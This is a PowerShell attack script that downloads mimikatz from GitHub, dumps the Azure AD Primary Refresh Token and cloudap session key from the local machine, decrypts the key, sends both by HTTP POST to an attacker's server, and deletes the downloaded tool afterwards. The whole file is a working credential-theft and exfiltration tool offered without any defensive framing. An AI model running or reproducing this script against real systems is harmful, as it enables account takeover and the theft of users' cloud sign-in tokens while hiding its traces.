$url = "https://github.com/PenFr/MM/blob/main/mimikatz.exe?raw=true"
$outpath = "$PSScriptRoot/exe.exe"
$IP = "<Server-IP>"
Invoke-WebRequest -Uri $url -OutFile $outpath


New-Item -Path "C:\" -Name "logfiles" -ItemType "directory"
#New-Item -Path "c:\logfiles" -Name "log.txt" -ItemType "file"
#$PSScriptRoot | Out-File -FilePath "C:\logfiles\log.txt" -Encoding 'ascii' -Append

cd $PSScriptRoot

$test = .\exe.exe "privilege::debug" "Sekurlsa::cloudap" exit

#$test | Out-File -FilePath "C:\logfiles\log.txt" -Encoding 'ascii' -Append

foreach($Stelle in $test){
  if($Stelle.Contains("KeyValue")){
	$KeyPlace = $Stelle.IndexOf("KeyValue")
	#$KeyPlace
	$Key = $Stelle.Substring($KeyPlace+11,360)
	#$Key
	$PRTPlace = $Stelle.IndexOf('"Prt":')
  	#Write-Host $PRTPlace -Foregroundcolor red

	$EndOfPRT = $Stelle.IndexOf('"', $PRTPlace+10) 
	$PRT = $Stelle.Substring($PRTPlace+7,$EndOfPRT-$PRTPlace-7)  #verschiebung wieder abziehen
	#$PRT
  }
}

$test2 = .\exe.exe "token::elevate" "dpapi::cloudapkd /keyvalue:$Key /unprotect" exit


foreach($k in $test2){
		
		if($k.Contains("Clear key")){
		$ClearKey = $k
		}
	}

$body = "PRT:" + $PRT + "  " +$ClearKey + "   `n"

try{
    Invoke-WebRequest -Uri $IP -Method "POST" -Body $body -TimeoutSec 20
}catch{
}

Remove-Item $outpath
